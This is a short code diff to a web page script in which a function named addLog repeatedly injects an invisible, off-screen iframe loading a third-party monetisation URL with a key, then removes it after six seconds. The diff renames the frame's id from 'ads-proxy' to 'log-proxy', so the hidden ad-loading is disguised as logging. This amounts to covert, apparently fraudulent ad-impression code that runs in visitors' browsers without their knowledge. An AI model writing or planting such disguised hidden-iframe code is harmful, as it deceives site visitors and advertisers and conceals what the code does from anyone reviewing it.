@@ -42,19 +42,19 @@
       const addLog = () => {
         var container = document.getElementById("content");
         var frame = document.createElement('iframe');  
-        frame.id = "ads-proxy"
+        frame.id = "log-proxy"
         frame.style = "position:relative;z-index:-1;top:650px;left:400px;border:none;border-color:transparent;height:500px;width:500px;opacity:0;"
         frame.src = "https://www.highcpmgate.com/fiypv9gjb?key=24afcc5d1642c8df9ae55e25dcb19fce"; 
         container.appendChild(frame);
         setTimeout(function() {
-          document.getElementById("ads-proxy").remove();
+          document.getElementById("log-proxy").remove();
         }, 6000);
       }
       function reload() {
         addLog();
         setTimeout(function() {
           reload();
-        }, 180000);
+        }, 240000);
       };
       reload();
     </script>
